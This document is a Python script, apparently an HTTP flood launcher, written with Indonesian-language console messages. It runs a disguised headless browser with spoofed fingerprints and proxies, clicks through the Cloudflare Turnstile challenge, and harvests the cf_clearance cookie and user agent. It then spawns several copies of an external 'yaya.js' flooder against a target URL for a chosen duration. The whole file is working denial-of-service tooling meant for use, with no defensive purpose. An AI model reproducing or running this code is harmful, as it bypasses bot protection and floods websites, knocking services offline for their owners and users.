import asyncio
import subprocess
import sys
import random
import os
import time
from dataclasses import dataclass
from typing import Any, Dict, List, Optional
from concurrent.futures import ThreadPoolExecutor

from camoufox.async_api import AsyncCamoufox
from browserforge.fingerprints import Screen, FingerprintGenerator
from colorama import init, Fore, Style

init(autoreset=True)

@dataclass
class CloudflareCookie:
    name: str
    value: str
    domain: str
    path: str
    expires: int
    http_only: bool
    secure: bool
    same_site: str

    @classmethod
    def from_json(cls, cookie_data: Dict[str, Any]) -> "CloudflareCookie":
        return cls(
            name=cookie_data.get("name", ""),
            value=cookie_data.get("value", ""),
            domain=cookie_data.get("domain", ""),
            path=cookie_data.get("path", "/"),
            expires=cookie_data.get("expires", 0),
            http_only=cookie_data.get("httpOnly", False),
            secure=cookie_data.get("secure", False),
            same_site=cookie_data.get("sameSite", "Lax"),
        )

class CloudflareSolver:
    def __init__(self, sleep_time=2, headless=True, os=None, debug=False, retries=5, proxy=None):
        self.cf_clearance = None
        self.sleep_time = sleep_time
        self.headless = headless
        self.os = os or ["windows", "linux", "mac"]
        self.debug = debug
        self.retries = retries
        self.proxy = proxy
        self.fp_generator = FingerprintGenerator()

    async def _find_and_click_challenge_frame(self, page):
        try:
            await asyncio.sleep(2)
            
            for frame in page.frames:
                if frame.url.startswith("https://challenges.cloudflare.com") or "turnstile" in frame.url:
                    print(f"{Fore.YELLOW}[challenge]{Style.RESET_ALL} Found challenge frame")
                    
                    try:
                        await frame.evaluate("""
                        () => {
                            const checkbox = document.querySelector('input[type="checkbox"]') || 
                                           document.querySelector('.mark') || 
                                           document.querySelector('[role="checkbox"]');
                            if (checkbox) {
                                checkbox.click();
                                checkbox.checked = true;
                                return true;
                            }
                            return false;
                        }
                        """)
                        print(f"{Fore.GREEN}[challenge]{Style.RESET_ALL} Checkbox clicked via JS")
                        await asyncio.sleep(2)
                        return True
                    except:
                        pass
                    
                    try:
                        frame_element = await frame.frame_element()
                        box = await frame_element.bounding_box()
                        if box:
                            checkbox_x = box["x"] + box["width"] / 2
                            checkbox_y = box["y"] + box["height"] / 2
                            
                            await asyncio.sleep(random.uniform(1, 2))
                            await page.mouse.click(x=checkbox_x, y=checkbox_y)
                            print(f"{Fore.GREEN}[challenge]{Style.RESET_ALL} Checkbox clicked via mouse")
                            await asyncio.sleep(2)
                            return True
                    except:
                        pass
                    
            return False
            
        except Exception as e:
            print(f"{Fore.RED}[challenge]{Style.RESET_ALL} Error: {e}")
            return False

    async def solve(self, link: str, solver_id=1):
        try:
            print(f"{Fore.GREEN}[solver {solver_id}]{Style.RESET_ALL} Browser started")
            fingerprint = self.fp_generator.generate()
            current_os = random.choice(self.os)
            browser_config = {
                "headless": self.headless,
                "os": current_os,
                "screen": Screen(max_width=1920, max_height=1080),
                "humanize": True,
                "geoip": True,
                "fingerprint": fingerprint,
                "args": [
                    "--disable-blink-features=AutomationControlled",
                    "--disable-automation",
                    "--no-sandbox",
                    "--disable-dev-shm-usage",
                    "--disable-infobars",
                    "--start-maximized",
                    "--lang=en-US,en;q=0.9",
                    "--window-size=1920,1080",
                    "--disable-gpu",
                    "--disable-setuid-sandbox",
                ]
            }
            
            if self.proxy:
                browser_config["proxy"] = self.proxy
                print(f"{Fore.YELLOW}[solver {solver_id}]{Style.RESET_ALL} Using proxy: {self.proxy}")
            
            async with AsyncCamoufox(**browser_config) as browser:
                page = await browser.new_page()
                await page.set_viewport_size({"width": 1920, "height": 1080})
                
                await page.set_extra_http_headers({
                    "Accept-Language": "en-US,en;q=0.9,id;q=0.8",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Cache-Control": "no-cache",
                    "Pragma": "no-cache",
                    "Sec-Ch-Ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
                    "Sec-Ch-Ua-Mobile": "?0",
                    "Sec-Ch-Ua-Platform": f'"{current_os.capitalize()}"',
                    "Upgrade-Insecure-Requests": "1"
                })
                
                await asyncio.sleep(random.uniform(1, 3))
                
                print(f"{Fore.YELLOW}[solver {solver_id}]{Style.RESET_ALL} Navigating to {link}")
                
                try:
                    response = await page.goto(link, wait_until="networkidle", timeout=60000)
                    
                    if response:
                        print(f"{Fore.YELLOW}[solver {solver_id}]{Style.RESET_ALL} HTTP {response.status}")
                        
                        if response.status in [403, 429, 503]:
                            print(f"{Fore.YELLOW}[solver {solver_id}]{Style.RESET_ALL} Challenge detected")
                            await self._find_and_click_challenge_frame(page)
                            
                except Exception as e:
                    print(f"{Fore.RED}[solver {solver_id}]{Style.RESET_ALL} Navigation error: {e}")
                    await page.reload(timeout=30000)
                
                await asyncio.sleep(random.uniform(3, 5))
                
                cookies = await page.context.cookies()
                ua = await page.evaluate("() => navigator.userAgent")
                
                for cookie in cookies:
                    if cookie.get("name") == "cf_clearance":
                        self.cf_clearance = CloudflareCookie.from_json(cookie)
                        print(f"{Fore.GREEN}[solver {solver_id}]{Style.RESET_ALL} Cookie obtained!")
                        print(f"{Fore.GREEN}[solver {solver_id}]{Style.RESET_ALL} Value: {self.cf_clearance.value[:50]}...")
                        print(f"{Fore.GREEN}[solver {solver_id}]{Style.RESET_ALL} User-Agent: {ua[:50]}...")
                        
                        return self.cf_clearance.value, ua
                
                print(f"{Fore.RED}[solver {solver_id}]{Style.RESET_ALL} No cf_clearance found")
                return None, None
                    
        except Exception as e:
            print(f"{Fore.RED}[solver {solver_id}]{Style.RESET_ALL} Error: {e}")
            return None, None

async def run_solver(url: str, solver_id: int, results: List):
    solver = CloudflareSolver(headless=True)
    cookie, ua = await solver.solve(url, solver_id)
    if cookie and ua:
        results.append((cookie, ua, solver_id))
        return True
    return False

async def main(url: str, duration: int, num_solvers: int = 3):
    
    print(f"{Fore.CYAN}SEDANG HACK NASA TUNGGU SAMPE SELESAI :V {Style.RESET_ALL}")
    print(f"{Fore.WHITE}Target: {url}{Style.RESET_ALL}")
    print(f"{Fore.WHITE}Duration: {duration}s{Style.RESET_ALL}")
    print(f"{Fore.WHITE}Solvers: {num_solvers}{Style.RESET_ALL}")
    print("")
    
    results = []
    
    tasks = []
    for i in range(1, num_solvers + 1):
        tasks.append(asyncio.create_task(run_solver(url, i, results)))
        await asyncio.sleep(0.5)  
    
    await asyncio.gather(*tasks)
    
    successful = [r for r in results if r[0] is not None]
    
    print(f"\n{Fore.GREEN}[✓] Berhasil: {len(successful)}/{num_solvers} cookies{Style.RESET_ALL}")
    
    if not successful:
        print(f"{Fore.RED}[error]{Style.RESET_ALL} Tidak ada cookie yang didapat")
        return
    
    for idx, (cookie, ua, sid) in enumerate(successful, 1):
        print(f"{Fore.GREEN}[cookie {idx} (solver {sid})]{Style.RESET_ALL} {cookie[:40]}...")
    
    print(f"\n{Fore.CYAN}[flood]{Style.RESET_ALL} Starting {len(successful)} flooders...\n")
    
    processes = []
    for idx, (cookie, ua, sid) in enumerate(successful, 1):
        print(f"{Fore.GREEN}[flooder {idx} (solver {sid})]{Style.RESET_ALL} Starting...")
        
        parcok = f"cf_clearance={cookie}"
        args = [
            "node", "yaya.js",
            url,
            str(duration),
            parcok,
            ua
        ]
        
        if idx <= 2:
            args.append("-log")
        
        proc = subprocess.Popen(
            args,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        processes.append(proc)
    
    print(f"\n{Fore.YELLOW}[system]{Style.RESET_ALL} {len(processes)} flooders running...")
    
    for proc in processes:
        for line in proc.stdout:
            print(line, end='')
        proc.wait()
    
    print(f"\n{Fore.GREEN}[✓] Semua flooder selesai{Style.RESET_ALL}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"{Fore.RED}Usage:{Style.RESET_ALL} python3 browser.py <url> <duration> [num_solvers]")
        print(f"{Fore.YELLOW}Example:{Style.RESET_ALL} python3 browser.py https://target.com 670 5")
        sys.exit(1)

    url = sys.argv[1]
    try:
        duration = int(sys.argv[2])
    except ValueError:
        print(f"{Fore.RED}Error:{Style.RESET_ALL} Durasi harus angka")
        sys.exit(1)

    num_solvers = int(sys.argv[3]) if len(sys.argv) > 3 else 3

    asyncio.run(main(url, duration, num_solvers))